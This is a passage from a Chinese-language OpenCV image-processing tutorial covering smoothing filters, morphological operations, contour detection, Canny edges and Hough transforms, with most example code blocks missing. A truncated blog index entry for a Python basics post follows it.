对花朵图像进行均值滤波操作。分别使用大小为3×3、5×5和9×9的滤波核对花朵图像进行均值滤波操\n作，具体代码如下：\n\n上述代码的运行结果如图11.5所示，从这个结果可以看出，滤波核越大，处理之后的图像就越模糊。\n\n                                                                                      图11.5　图像均值滤波效果\n\n11.2　中值滤波器中值滤波器的原理与均值滤波器非常相似，唯一的不同就是不计算像素的平均值，而是将所有像素值排序，把最中间的像素值取出，赋值给核心像素。\n例如，图11.6就是中值滤波的计算过程。滤波核大小为3×3，核心像素值是35，周围像素值都为110～150。将核内所有像素值按升序排列，9个像素值排成一行，最中间位置为第5个位置，这个位置的像素值为131。不需再做任何计算，直接把131赋值给核心像素，其颜色就与周围颜色差别不大，图像就变得平滑了。这就是中值滤波去噪的原理。\n\n图11.6　中值滤波的计算过程OpenCV将中值滤波器封装成medianBlur()方法，其语法如下：\n dst = cv2.medianBlur(src, ksize)\n\n参数说明：　\nsrc：被处理的图像。　\nksize：滤波核的边长，必须是大于1的奇数，如3、5、7等。该方法根据此边长自动创建一个正方形的滤波核。\n返回值说明：　\ndst：经过中值滤波处理之后的图像。\n注意中值滤波器的ksize参数是边长，而其他滤波器的ksize参数通常为（高，宽）。\n【实例11.2】　对花朵图像进行中值滤波操作.分别使用边长为3、5、9的滤波核对花朵图像进行中值滤波操作，具体代码如下：\n\n上述代码的运行结果如图11.7所示，滤波核的边长越长，处理之后的图像就越模糊。中值滤波处理的图像会比均值滤波处理的图像丢失更多细节。\n\n                                                                                  图11.7　图像中值滤波效果\n\n11.3　高斯滤波器高斯滤波也被称为高斯模糊或高斯平滑，是目前应用最广泛的平滑处理算法。高斯滤波可以很好地在降低图片噪声、细节层次的同时保留更多的图像信息，经过处理的图像呈现“磨砂玻璃”的滤镜效果。进行均值滤波处理时，核心周围每个像素的权重都是均等的，也就是每个像素都同样重要，所以计算平均值即可。但在高斯滤波中，越靠近核心的像素权重越大，越远离核心的像素权重越小，例如5×5大小的高斯滤波卷积核的权重示意图如图11.8所示。像素权重不同不能取平均值，要从权重大的像素中取较多的信息，从权重小的像素中取较少的信息。简单概括就是“离谁更近，跟谁更像”。高斯滤波的计算过程涉及卷积运算，会有一个与滤波核大小相等的卷积核。本节仅以3×3的滤波核为例，简单地描述一下高斯滤波的计算过程。卷积核中保存的值就是核所覆盖区域的权重值，其遵循图11.8的规律。卷积核中所有权重值相加的结果为1。例如，3×3的卷积核可以是如图11.9所示的值。随着核大小、σ标准差的变化，卷积核中的值也会发生较大变化，图11.9仅是一种最简单的情况。\n\n                                                             图11.8　5×5的高斯滤波卷积核的权重示意图\n\n\n                                                                               图11.9　简化的3×3的卷积核\n\n进行高斯滤波的过程中，滤波核中像素与卷积核进行卷积计算，最后将计算结果赋值给滤波核的核心像素。其计算过程如图11.10所示。\n\n                                                                                       图11.10　像素与卷积核进行卷积计算\n\nOpenCV将高斯滤波器封装成了GaussianBlur()方法，其语法如下：\n dst = cv2.GaussianBlur(src, ksize, sigmaX, sigmaY, borderType)\n\n参数说明：　\nsrc：被处理的图像。\nksize：滤波核的大小，宽高必须是奇数，如(3, 3)、(5, 5)等。　\nsigmaX：卷积核水平方向的标准差。　\nsigmaY：卷积核垂直方向的标准差。　修改sigmaX或sigmaY的值都可以改变卷积核中的权重比例。如果不知道如何设计这2个参数值，就直接把这2个参数的值写成0，该方法就会根据滤波核的大小自动计算合适的权重比例。　\nborderType：可选参数，边界样式，建议使用默认值。\n返回值说明：　\ndst：经过高斯滤波处理之后的图像。\n【实例11.3】　对花朵图像进行高斯滤波操作。分别使用大小为5×5、9×9和15×15的滤波核对花朵图像进行高斯滤波操作，水平方向和垂直方向的标准差参数值全部为0，具体代码如下：\n\n上述代码的运行结果如图11.11所示，滤波核越大，处理之后的图像就越模糊。和均值滤波、中值滤波处理的图像相比，高斯滤波处理的图像更加平滑，保留的图像信息更多，更容易辨认。\n\n\n                                                                                图11.11　图像的高斯滤波效果\n\n11.4　双边滤波器不管是均值滤波、中值滤波还是高斯滤波，都会使整幅图像变得平滑，图像中的边界会变得模糊不清。双边滤波是一种在平滑处理过程中可以有效保护边界信息的滤波操作方法。双边滤波器自动判断滤波核处于“平坦”区域还是“边缘”区域：如果滤波核处于“平坦”区域，则会使用类似高斯滤波的算法进行滤波；如果滤波核处于“边缘”区域，则加大“边缘”像素的权重，尽可能地让这些像素值保持不变。例如，图11.12是一幅黑白拼接图像，对这幅图像进行高斯滤波，黑白交界处就会变得模糊不清，效果如图11.13所示，但如果对这幅图像进行双边滤波，黑白交界处的边界则可以很好地保留下来，效果如图11.14所示。\n\n                                                                                         图11.12　原图\n\n\n                                                                                  图11.13　高斯滤波效果\n\n\n                                                                                  图11.14　双边滤波效果\n\nOpenCV将双边滤波器封装成bilateralFilter()方法，其语法如下：\n dst = cv2.bilateralFilter(src, d, sigmaColor, sigmaSpace, borderType)\n\n参数说明：　\nsrc：被处理的图像。　\nd：以当前像素为中心的整个滤波区域的直径。如果d&lt;0，则自动根据sigmaSpace参数计算得到。该值与保留的边缘信息数量成正比，与方法运行效率成反比。　\nsigmaColor：参与计算的颜色范围，这个值是像素颜色值与周围颜色值的最大差值，只有颜色值之差小于这个值时，周围的像素才进行滤波计算。值为255时，表示所有颜色都参与计算。　\nsigmaSpace：坐标空间的σ（sigma）值，该值越大，参与计算的像素数量就越多。　\nborderType：可选参数，边界样式，建议默认。返回值说明：　\ndst：经过双边滤波处理之后的图像。\n【实例11.4】　对比高斯滤波和双边滤波的处理效果。\n使用大小为(15, 15)的滤波核对花朵图像进行高斯滤波处理，同样使用15作为范围直径对花朵图像进行双边滤波处理，观察两种滤波处理之后的图像边缘有什么差别，具体代码如下：\n\n上述代码的运行结果如图11.15所示，可以看出高斯滤波模糊了整个画面，但双边滤波保留了较清晰的边缘信息。\n\n                                                                       图11.15　两种滤波方法效果对比\n\n11.5　小结噪声指的是一幅图像内部的、高亮度的像素点。图像平滑处理是指在尽量保留原图像信息的情况下，去除图像内部的这些高亮度的像素点（也就是“噪声”）。为了实现图像平滑处理，需要的工具就是滤波器。本章主要讲解了OpenCV中的4种滤波器，虽然每种滤波器的实现原理都不同，但是每种滤波器都能对图像进行图像平滑处理。读者朋友在掌握这4种滤波器的实现方法的同时，也要熟悉这4种滤波器的实现原理。\n第12章　腐蚀与膨胀腐蚀和膨胀是图像形态学中的两种核心操作，通过这两种操作可以清除或强化图像中的细节。合理使用腐蚀和膨胀，还可以实现图像开运算、闭运算、梯度运算、顶帽运算和黑帽运算等极具特点的操作。下面将对腐蚀、膨胀以及其他形态学操作进行详细的介绍。\n\n12.1　腐蚀腐蚀操作可以让图像沿着自己的边界向内收缩。OpenCV通过“核”来实现收缩计算。“核”的英文名为kernel，在形态学中可以理解为“由n个像素组成的像素块”，像素块包含一个核心（核心通常在中央位置，也可以定义在其他位置）。像素块在图像的边缘移动，在移动过程中，核会将图像边缘那些与核重合但又没有越过核心的像素点都抹除，效果类似图12.1所示的过程，就像削土豆皮一样，将图像一层一层地“削薄”。\n\n                                                                                   图12.1　核腐蚀图像中的像素\n\nOpenCV将腐蚀操作封装成erode()方法，该方法的语法如下：\n dst = cv2.erode(src, kernel, anchor, iterations, borderType, borderValue)\n\n参数说明：\nsrc：原始图像。\nkernel：腐蚀使用的核。　\nanchor：可选参数，核的锚点位置。　\niterations：可选参数，腐蚀操作的迭代次数，默认值为1。　\nborderType：可选参数，边界样式，建议默认。　\nborderValue：可选参数，边界值，建议默认。\n返回值说明：　\ndst：经过腐蚀之后的图像。图像经过腐蚀操作之后，可以抹除一些外部的细节，如图12.2所示是一个卡通小蜘蛛，如果用一个5×5的像素块作为核对小蜘蛛进行腐蚀操作，可以得到如图12.3所示的结果。小蜘蛛的腿被当成外部细节抹除了，同时小蜘蛛的眼睛变大了，因为核从内部也“削”了一圈。\n\n                                                                                           图12.2　原图\n\n\n                                                                                     图12.3　腐蚀之后的图像\n\n在OpenCV做腐蚀或其他形态学操作时，通常使用numpy模块来创建核数组，例如：\n import numpy as np\n k = np.ones((5, 5), np.uint8)\n\n这两行代码就是通过numpy模块的ones()方法创建了一个5行5列（简称5×5）、数字类型为无符号8位整数、每一个数字的值都是1的数组，这个数组作为erode()方法的核参数。除了5×5的结构，还可以使用3×3、9×9、11×11等结构，行列数越大，计算出的效果就越粗糙，行列数越小，计算出的效果就越精细。\n【实例12.1】　将仙人球图像中的刺抹除。仙人球的叶子呈针状，茎呈深绿色，如图12.4所示。\n\n                                                                                           图12.4　仙人球\n\n使用3×3的核对仙人球图像进行腐蚀操作，可以将图像里的刺抹除，具体代码如下：\n\n上述代码的运行结果如图12.5所示。\n\n                                                                          图12.5　图像腐蚀操作效果\n\n12.2　膨胀膨胀操作与腐蚀操作相反，膨胀操作可以让图像沿着自己的边界向内扩张。同样是通过核来计算，当核在图像的边缘移动时，核会将图像边缘填补新的像素，效果类似图12.6所示的过程，就像在一面墙上反反复复地涂水泥，让墙变得越来越厚。\n\n                                                                                  图12.6　核填补图像中的像素\n\nOpenCV将膨胀操作封装成dilate()方法，该方法的语法如下：\n dst = cv2.dilate(src, kernel, anchor, iterations, borderType, borderValue)\n\n参数说明：　\nsrc：原始图像。　\nkernel：膨胀使用的核。　\nanchor：可选参数，核的锚点位置。　\niterations：可选参数，腐蚀操作的迭代次数，默认值为1。　\nborderType：可选参数，边界样式，建议默认。　\nborderValue：可选参数，边界值，建议默认。返回值说明：　\ndst：经过膨胀之后的图像。图像经过膨胀操作之后，可以放大一些外部的细节，如图12.7（a）所示的卡通小蜘蛛，如果用一个5×5的像素块作为核对小蜘蛛进行膨胀操作，可以得到如图12.7（b）所示的结果，小蜘蛛不仅腿变粗了，而且连眼睛都胖没了。\n\n                                                                            图12.7　图像膨胀操作效果\n\n【实例12.2】　将图像加工成“近视眼”效果。近视眼由于聚焦不准，看东西都需要放大并且模模糊糊的，利用膨胀操作可以将正常画面处理成近视眼看到的画面。采用9×9的数组作为核，对图12.8（a）进行膨胀操作。具体代码如下：\n\n上述代码的运行结果如图12.8所示\n\n                                                               图12.8　图像膨胀操作“近视眼”效果\n\n12.3　开运算开运算是将图像先进行腐蚀操作，再进行膨胀操作。开运算可以用来抹除图像外部的细节（或者噪声）。例如，图12.9是一个简单的二叉树，父子节点之间都有线连接。如果对此图像进行腐蚀操作，可以得出如图12.10所示的图像，连接线消失了，节点也比原图节点小一圈。此时再执行膨胀操作，让缩小的节点恢复到原来的大小，就得到了如图12.11所示的效果。这3幅图就是开运算的过程，从结果中可以明显地看出：经过开运算之后，二叉树中的连接线消失了，只剩下光秃秃的节点。因为连接线被核当成“细节”抹除了，所以利用检测轮廓的方法可以统计二叉树节点数量，也就是说在某些情况下，开运算的结果还可以用来做数量统计。\n\n                                                                                    图12.9　简单的二叉树\n\n\n                                                                  图12.10　二叉树图像腐蚀之后的效果\n\n\n                                                                     图12.11　对腐蚀的图像做膨胀操作\n\n【实例12.3】　抹除黑种草图像中的针状叶子。黑种草如图12.12（a）所示，花呈蓝色，叶子像针一样又细又长，呈羽毛状。要抹除黑种草图像中的叶子，可以使用5×5的核对图像进行开运算。具体代码如下：\n\n上述代码的运行结果如图12.12（b）所示，经过开运算后黑种草图像虽然略为模糊，但叶子都不见了。\n\n                                                                                               图12.12　图像开运算效果\n\n12.4　闭运算闭运算是将图像先进行膨胀操作，再进行腐蚀操作。闭运算可以抹除图像内部的细节（或者噪声）。例如，图12.13（a）是一个身上布满斑点的小蜘蛛，这些斑点就是图像的内部细节。先将图像进行膨胀操作，小蜘蛛身上的斑点（包括眼睛）被抹除，效果如图12.13（b）所示。然后再将图像进行腐蚀操作，膨胀的小蜘蛛恢复到原来的大小，效果如图12.13（c）所示。\n\n                                                                              图12.13　图像闭运算效果\n\n这3幅图就是闭运算的过程，从结果中可以明显地看出：经过闭运算后，小蜘蛛身上的花纹都被抹除了，就连眼睛也被当成“细节”抹除了。闭运算除了会抹除图像内部的细节，还会让一些离得较近的区域合并成一块区域。\n【实例12.4】　对汉字图片进行闭运算。使用15×15的核对图12.14（a）做闭运算。因为使用的核比较大，很容易导致一些间隔较近的区域合并到一起，观察闭运算对汉字图片造成了哪些影响。具体代码如下：\n\n上述代码的运行结果如图12.14（b）所示，“田”字经过闭运算之后没有多大变化，但是“野”字经过闭运算之后，许多独立的区域因膨胀操作合并到一起，导致文字很难辨认。\n\n                                                                                    图12.14　汉字图片闭运算效果\n\n12.5　形态学运算腐蚀和膨胀是形态学的基础操作，除了开运算和闭运算以外，形态学中还有几种比较有特点的运算。OpenCV提供了一个morphologyEx()形态学方法，包含所有常用的运算，其语法如下：\n dst = cv2.morphologyEx(src, op, kernel, anchor, iterations, borderType, borderValue)\n\n参数说明：　\nsrc：原始图像。　\nop：操作类型，具体值如表12.1所示。\n                                                                       表12.1　形态学函数的操作类型参数　\n\n\nkernel：操作过程中使用的核。　\nanchor：可选参数，核的锚点位置。　\niterations：可选参数，迭代次数，默认值为1。　\nborderType：可选参数，边界样式，建议默认。　\nborderValue：可选参数，边界值，建议默认。\n返回值说明：　\ndst：操作之后得到的图像。morphologyEx()方法实现的腐蚀、膨胀、开运算和闭运算效果与前文中介绍的效果完全一致，本节不再赘述，下面将介绍3个特点鲜明的操作：梯度运算、顶帽运算和黑帽运算。\n12.5.1　梯度运算这里的梯度是指图像梯度，可以简单地理解为像素的变化程度。如果几个连续的像素，其像素值跨度越大，则梯度值越大。梯度运算的运算过程如图12.15所示，让原图的膨胀图减原图的腐蚀图。因为膨胀图比原图大，腐蚀图比原图小，利用腐蚀图将膨胀图掏空，就得到了原图的轮廓图。说明梯度运算中得到的轮廓图只是一个大概轮廓，不精准。\n\n                                                                             图12.15　梯度运算过程\n\n梯度运算的参数为cv2.MORPH_GRADIENT，下面通过一段代码实现图12.15的效果。\n【实例12.5】　通过梯度运算画出小蜘蛛的轮廓。使用5×5的核对小蜘蛛图像进行形态学梯度运算，具体代码如下：\n\n上述代码的运行结果如图12.16所示。\n\n                                                                                       图12.16　图像梯度运算效果\n\n12.5.2　顶帽运算顶帽运算的运算过程如图12.17所示，让原图减原图的开运算图。因为开运算抹除图像的外部细节，“有外部细节”的图像减去“无外部细节”的图像，得到的结果就只剩外部细节了，所以经过顶帽运算之后，小蜘蛛就只剩蜘蛛腿了。\n\n                                                                                  图12.17　顶帽运算过程\n\n顶帽运算的参数为cv2.MORPH_TOPHAT，下面通过一段代码实现图12.18的效果。\n【实例12.6】　通过顶帽运算画出小蜘蛛的腿。使用5×5的核对小蜘蛛图像进行顶帽运算，具体代码如下：\n\n上述代码的运算结果如图12.18所示。\n\n                                                                                            图12.18　图像开运算效果\n\n12.5.3　黑帽运算黑帽运算的运算过程如图12.19所示，让原图的闭运算图减去原图。因为闭运算抹除图像的内部细节，“无内部细节”的图像减去“有内部细节”的图像，得到的结果就只剩内部细节了，所以经过黑帽运算之后，小蜘蛛就只剩下斑点、花纹和眼睛了。\n\n                                                                              图12.19　黑帽运算过程\n\n黑帽运算的参数为cv2.MORPH_BLACKHAT，下面通过一段代码实现图12.19的效果。\n【实例12.7】　通过黑帽运算画出小蜘蛛身上的花纹。使用5×5的核对小蜘蛛图像进行黑帽运算，具体代码如下：\n\n上述代码的运行结果如图20所示。\n\n                                                                                图12.20　图像黑帽运算效果\n\n12.6　小结本章介绍的基础内容是腐蚀和膨胀。读者掌握了其用法，就能轻而易举地实现开运算和闭运算。其中，开运算是对图像先进行腐蚀操作，再进行膨胀操作，其作用是抹除图像外部的细节；而闭运算是对图像先进行膨胀操作，再进行腐蚀操作，其作用是抹除图像内部的细节。此外，形态学运算也是构建在腐蚀和膨胀的基础上的。其中，梯度运算是让原图的膨胀图减原图的腐蚀图，得到的结果是原图的轮廓；顶帽运算是让原图减原图的开运算图，得到的结果是图像的外部细节；黑帽运算是让原图的闭运算图减去原图，得到的结果是图像的内部细节。\n第13章　图形检测图形检测是计算机视觉的一项重要功能。通过图形检测可以分析图像中可能存在的形状，然后对这些形状进行描绘，如搜索并绘制图像的边缘，定位图像的位置，判断图像中有没有直线、圆形等。虽然图形检测涉及非常深奥的数学算法，但OpenCV已经将这些算法封装成简单的方法，开发者只要学会如何调用方法、调整参数即可很好地实现检测功能。本章将介绍如何检测图像的形状、图像所占的区域，以及如何查找图像中出现的几何图形等。\n\n13.1　图像的轮廓轮廓是指图像中图形或物体的外边缘线条。简单的几何图形轮廓是由平滑的线构成的，容易识别，但不规则图形的轮廓可能由许多个点构成，识别起来比较困难。OpenCV提供的findContours()方法可以通过计算图像梯度来判断图像的边缘，然后将边缘的点封装成数组返回。findContours()方法的语法如下：\n contours, hierarchy = cv2.findContours(image, mode, methode)\n\n参数说明：　\nimage：被检测的图像，必须是8位单通道二值图像。如果原始图像是彩色图像，必须转为灰度图像，并经过二值化处理。　\nmode：轮廓的检索模式，具体值如表13.1所示。\n                                                                                          表13.1　轮廓的检索模式参数值\n\n\nmethode：\n检测轮廓时使用的方法，具体值如表13.2所示。\n                                                                                        表13.2　检测轮廓时使用的方法\n\n\n返回值说明：　\ncontours：检测出的所有轮廓，list类型，每一个元素都是某个轮廓的像素坐标数组。　\nhierarchy：轮廓之间的层次关系。通过findContours()方法找到图像轮廓后，为了方便开发人员观测，最好能把轮廓画出来，于是OpenCV提供了drawContours()方法用来绘制这些轮廓。drawContours()方法的语法如下：\n image = cv2.drawContours(image, contours, contourIdx, color, thickness, lineTypee, hierarchy, maxLevel, offse)\n\n参数说明：\nimage：被绘制轮廓的原始图像，可以是多通道图像。　\ncontours：findContours()方法得出的轮廓列表。　\ncontourIdx：绘制轮廓的索引，如果为-1则绘制所有轮廓。　\ncolor：绘制颜色，使用BGR格式。　\nthickness：可选参数，画笔的粗细程度，如果该值为-1则绘制实心轮廓。　\nlineTypee：可选参数，绘制轮廓的线型。　\nhierarchy：可选参数，findContours()方法得出的层次关系。　\nmaxLevel：可选参数，绘制轮廓的层次深度，最深绘制第maxLevel层。　\noffse：可选参数，偏移量，可以改变绘制结果的位置。\n返回值说明：\nimage：同参数中的image，执行后原始图中就包含绘制的轮廓了，可以不使用此返回值保存结果。\n【实例13.1】　绘制几何图像的轮廓。将如图13.1所示的几何图像转换成二值灰度图像，然后通过findContours()方法找到出现的所有轮廓，再通过drawContours()方法将这些轮廓绘制成红色。轮廓的检索模式采用cv2.RETR_LIST，检测方法采用cv2.CHAIN_APPROX_NONE。\n\n                                                                             图13.1　简单的几何图像\n\n具体代码如下：\n\n上述代码的运行结果如图13.2所示。\n\n                                                                                       图13.2　绘制全部轮廓\n\n如果使用cv2.RETR_EXTERNAL做参数则只绘制外轮廓，关键代码如下：\n contours, hierarchy = cv2.findContours(binary, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)\n cv2.drawContours(img, contours, -1, (0, 0, 255), 5)\n\n绘制轮廓的效果如图13.3所示。\n\n                                                                           图13.3　只绘制外轮廓的效果\n\ndrawContours()方法的第3个参数可以指定绘制哪个索引的轮廓。索引的顺序由轮廓的检索模式决定，例如cv2.RETR_CCOMP模式下绘制索引为0的轮廓的关键代码如下：\n contours, hierarchy = cv2.findContours(binary, cv2.RETR_CCOMP, cv2.CHAIN_APPROX_NONE)\n cv2.drawContours(img, contours, 0, (0, 0, 255), 5)\n\n在同样的检索模式下，绘制索引为1的轮廓的关键代码如下：\n cv2.drawContours(img, contours, 1, (0, 0, 255), 5)\n\n绘制索引为2的轮廓的关键代码如下：\n cv2.drawContours(img, contours, 2, (0, 0, 255), 5)\n\n绘制索引为3的轮廓的关键代码如下：\n cv2.drawContours(img, contours, 3, (0, 0, 255), 5)\n\n绘制的效果如图13.4～图13.7所示。\n\n                                                                             图13.4　绘制索引为0的轮廓\n\n\n                                                                      图13.5　绘制索引为1的轮廓\n\n\n                                                                        图13.6　绘制索引为2的轮廓\n\n\n                                                                               图13.7　绘制索引为3的轮廓\n\n【实例13.2】　绘制花朵的轮廓。为图13.8（a）所示的花朵图像绘制轮廓，首先要降低图像中的噪声干扰，进行滤波处理，然后将图像处理成二值灰度图像，并检测出轮廓，最后利用绘制轮廓的方法在原始图像中绘制轮廓。具体代码如下：\n\n上述代码的运行结果如图13.8（b）和图13.8（c）所示。\n\n                                                                              图12.8　绘制花朵轮廓效果\n\n13.2　轮廓拟合拟合是指将平面上的一系列点，用一条光滑的曲线连接起来。轮廓的拟合就是将凹凸不平的轮廓用平整的几何图形体现出来。本节将介绍如何按照轮廓绘制矩形包围框和圆形包围框。\n13.2.1　矩形包围框矩形包围框是指图像轮廓的最小矩形边界。OpenCV提供的boundingRect()方法可以自动计算轮廓最小矩形边界的坐标、宽和高。boundingRect()方法的语法如下：\n retval = cv2.boundingRect (array)\n\n参数说明：　\narray：轮廓数组。\n返回值说明：\nretval：元组类型，包含4个整数值，分别是最小矩形包围框的：左上角顶点的横坐标、左上角顶点的纵坐标、矩形的宽和高。所以也可以写成x, y, w, h &#x3D; cv2.boundingRect (array)的形式。\n【实例13.3】　为爆炸图形绘制矩形包围框。\n\n                                                                                    图13.9　爆炸图形\n\n为图13.9所示的爆炸图形绘制矩形包围框，首先判断图形的轮廓，使用cv2.RETR_LIST检索所有轮廓，使用cv2.CHAIN_APPROX_SIMPLE检索图形所有的端点，然后利用cv2.boundingRect()方法计算最小矩形包围框，并通过cv2.rectangle()方法将这个矩形绘制出来，具体代码如下：\n\n上述代码的运行结果如图13.10所示。\n\n                                                                            图13.10　爆炸图形的最小矩形包围框\n\n13.2.2　圆形包围框圆形包围框与矩形包围框一样，是图像轮廓的最小圆形边界。OpenCV提供的minEnclosingCircle ()方法可以自动计算轮廓最小圆形边界的圆心和半径。minEnclosingCircle()方法的语法如下：\n center, radius = cv2.minEnclosingCircle(points)\n\n参数说明：　\npoints：轮廓数组。\n返回值说明：　\ncenter：元组类型，包含2个浮点值，是最小圆形包围框圆心的横坐标和纵坐标。　\nradius：浮点类型，最小圆形包围框的半径。\n【实例13.4】　为爆炸图形绘制圆形包围框。为图13.9所示的爆炸图形绘制矩形包围框，首先判断图形的轮廓，使用cv2.RETR_LIST检索所有轮廓，使用cv2.CHAIN_APPROX_SIMPLE检索图形所有的端点，然后利用cv2. minEnclosingCircle()方法计算最小圆形包围框，并通过cv2.circle()方法将这个矩形绘制出来。绘制过程中要注意：圆心坐标和圆半径都是浮点数，在绘制之前要将浮点数转换成整数。具体代码如下：\n\n上述代码的运行结果如图13.11所示。\n\n                                                                            图13.11　爆炸图形的最小圆形包围框\n\n13.3　凸包之前介绍了矩形包围框和圆形包围框，这2种包围框虽然已经逼近了图形的边缘，但这种包围框为了保持几何形状，与图形的真实轮廓贴合度较差。如果能找出图形最外层的端点，将这些端点连接起来，就可以围出一个包围图形的最小包围框，这种包围框叫凸包。凸包是最逼近轮廓的多边形，凸包的每一处都是凸出来的，也就是任意3个点组成的内角均小于180°。例如，图13.12就是凸包，而图13.13就不是凸包。\n\n                                                                                                图13.12　凸包\n\n\n                                                                                              图13.13　不是凸包\n\nOpenCV提供的convexHull()方法可以自动找出轮廓的凸包，该方法的语法如下：\n hull = cv2.convexHull(points, clockwise, returnPoints)\n\n参数说明：　\npoints：轮廓数组。　\nclockwise：可选参数，布尔类型。当该值为True时，凸包中的点按顺时针排列，为False时按逆时针排列。　\nreturnPoints：可选参数，布尔类型。当该值为True时返回点坐标，为False时返回点索引。默认值为True。\n返回值说明：　\nhull：凸包的点阵数组。下面通过一个例子演示如何绘制凸包。\n【实例13.5】　为爆炸图形绘制凸包。为图13.9所示的爆炸图形绘制凸包，首先要先判断图形的轮廓，使用cv2.RETR_LIST检索出图形的轮廓，然后使用convexHull()方法找到轮廓的凸包，最后通过polylines()方法将凸包中各点连接起来，具体代码如下：\n\n上述代码的运行结果如图13.14所示。\n\n                                                                                      图13.14　爆炸图形的凸包\n\n13.4　Canny边缘检测Canny边缘检测算法是John F. Canny于1986年开发的一个多级边缘检测算法，该算法根据像素的梯度变化寻找图像边缘，最终可以绘制十分精细的二值边缘图像。OpenCV将Canny边缘检测算法封装在Canny()方法中，该方法的语法如下：\n edges = cv2.Canny(image, threshold1, threshold2, apertureSize, L2gradient)\n\n参数说明：　\nimage：检测的原始图像。　\nthreshold1：计算过程中使用的第一个阈值，可以是最小阈值，也可以是最大阈值，通常用来设置最小阈值。　\nthreshold2：计算过程中使用的第二个阈值，通常用来设置最大阈值。　\napertureSize：可选参数，Sobel算子的孔径大小。　\nL2gradient：可选参数，计算图像梯度的标识，默认值为False。值为True时采用更精准的算法进行计算。\n返回值说明：　\nedges：计算后得出的边缘图像，是一个二值灰度图像。\n在开发过程中可以通过调整最小阈值和最大阈值控制边缘检测的精细程度。当2个阈值都较小时，检测出较多的细节；当2个阈值都较大时，忽略较多的细节。\n【实例13.6】　使用Canny算法检测花朵边缘。利用Canny()方法检测图13.15（a）所示的花朵图像，分别使用10和50、100和200、400和600作为最低阈值和最高阈值检测3次，具体代码如下：\n\n上述代码的运行结果如图13.15所示，阈值越小，检测出的边缘越多；阈值越大，检测出的边缘越少，只能检测出一些较明显的边缘。\n\n                                                                               图13.15　图像Canny检测效果\n\n13.5　霍夫变换霍夫变换是一种特征检测，通过算法识别图像的特征，从而判断图像中的特殊形状，例如直线和圆。本节将介绍如何检测图像中的直线和圆。\n13.5.1　直线检测霍夫直线变换是通过霍夫坐标系的直线与笛卡儿坐标系的点之间的映射关系来判断图像中的点是否构成直线。OpenCV将此算法封装成两个方法，分别是cv2.HoughLines()和cv2.HoughLinesP()，前者用于检测无限延长的直线，后者用于检测线段。本节仅介绍比较常用的HoughLinesP()方法。HoughLinesP()方法名称最后有一个大写的P，该方法只能检测二值灰度图像，也就是只有两种像素值的黑白图像。该方法最后把找出的所有线段的两个端点坐标保存成一个数组。HoughLinesP()方法的语法如下：\n lines = cv2.HoughLinesP(image, rho, theta, threshold, minLineLength, maxLineGap)\n\n参数说明：　\nimage：检测的原始图像。　\nrho：检测直线使用的半径步长，值为1时，表示检测所有可能的半径步长。　\ntheta：搜索直线的角度，值为π&#x2F;180°时，表示检测所有角度。　\nthreshold：阈值，该值越小，检测出的直线就越多。　\nminLineLength：线段的最小长度，小于该长度的线段不记录到结果中。　\nmaxLineGap：线段之间的最小距离。\n返回值说明：\nlines：一个数组，元素为所有检测出的线段，每条线段是一个数组，代表线段两个端点的横、纵坐标，格式为[[[x1, y1, x2, y2], [x1, y1, x2, y2]]]。注意使用该方法前应该为原始图像进行降噪处理，否则会影响检测结果。\n【实例13.7】　检测笔图像中出现的直线。\n检测如图13.16所示的中性笔照片，先将图像降噪，再对图像进行边缘检测，然后利用HoughLinesP()方法找出边缘图像中的直线线段，最后用cv2.line()方法将找出的线段绘制成红色。\n\n                                                                                            图13.16　笔图像\n\n具体代码如下：\n\n上述代码的运行结果如图13.17和图13.18所示。\n\n                                                                               图13.17　笔图像的边缘检测结果\n\n\n                                                                     图13.18　将笔图像中检测出的线段描红\n\n13.5.2　圆环检测霍夫圆环变换的原理与霍夫直线变换类似。OpenCV提供的HoughCircles()方法用于检测图像中的圆环，该方法在检测过程中进行两轮筛选：第一轮筛选找出可能是圆的圆心坐标，第二轮筛选计算这些圆心坐标可能对应的半径长度。该方法最后将圆心坐标和半径封装成一个浮点型数组。HoughCircles()方法的语法如下：\n circles = cv2.HoughCircles(image, method, dp, minDist, param1, param2, minRadius, maxRadius)\n\n参数说明：　\nimage：检测的原始图像。　\nmethod：检测方法，OpenCV 4.0.0及以前版本仅提供了cv2.HOUGH_GRADIENT作为唯一可用方法。　\ndp：累加器分辨率与原始图像分辨率之比的倒数。值为1时，累加器与原始图像具有相同的分辨率；值为2时，累加器的分辨率为原始图像的1&#x2F;2。通常使用1作为参数。　\nminDist：圆心之间的最小距离。　\nparam1：可选参数，Canny边缘检测使用的最大阈值。　\nparam2：可选参数，检测圆环结果的投票数。第一轮筛选时投票数超过该值的圆环才会进入第二轮筛选。值越大，检测出的圆环越少，但越精准。　\nminRadius：可选参数，圆环的最小半径。　\nmaxRadius：可选参数，圆环的最大半径。\n返回值说明：　\ncircles：一个数组，元素为所有检测出的圆环，每个圆环也是一个数组，内容为圆心的横、纵坐标和半径长度，格式为：[[[x1 ,y1, r1], [x2 ,y2, r2]]]。\n注意使用该方法前应该为原始图像进行降噪处理，否则会影响检测结果。\n【实例13.8】　检测硬币图像中出现的圆环。检测如图13.19所示的硬币照片，先将图像降噪，再将图像变成单通道灰度图像，然后利用HoughCircles()方法检测图像中可能是圆环的位置，最后通过cv2.circle()方法在这些位置上绘制圆环和对应的圆心。在绘制圆环之前，要将HoughCircles()方法返回的浮点数组元素转换成整数。\n\n                                                                                                   图13.19　硬币图像\n\n具体代码如下：\n\n上述代码的运行结果如图13.20所示。\n\n                                                                                               图13.20　检测出的圆环位置\n\n13.6　小结图像轮廓指的是将图像的边缘连接起来形成的一个整体，它是图像的一个重要的特征信息，通过对图像的轮廓进行操作，能够得到这幅图像的大小、位置和方向等信息，用于后续的计算。为此，OpenCV提供了findContours()方法，通过计算图像的梯度，判断图像的轮廓。为了绘制图像的轮廓，OpenCV又提供了drawContours()方法。但需要注意的是，Canny()方法虽然能够检测出图像的边缘，但这个边缘是不连续的。\n","categories":["后端","算法"],"tags":["python"]},{"title":"python基础总结","url":"/2020/05/03/python/python%E5%9F%BA%E7%A1%80/","content":"\n最近需要用python做数据分析，决定开始学python，总结一些基础笔记\n\n一、导语\npython是解析性语言\n\n&#96;&#96;&#96;python\n  能做什么  - 大数据分析  - 自动化运维与自动化测试  - web开发：`flask`、`jdango`  - 机器学习 `TensorFlow`  - 胶水语言：如混合c++、java编程，能够把其他语法编写的模块连接在一起**Python语言的特点**- 语法简洁- 可跨平台- 应用广泛- 支持中文- 强制可读：通过强制缩进体现语句间的逻辑关系提高了程序的可读性- 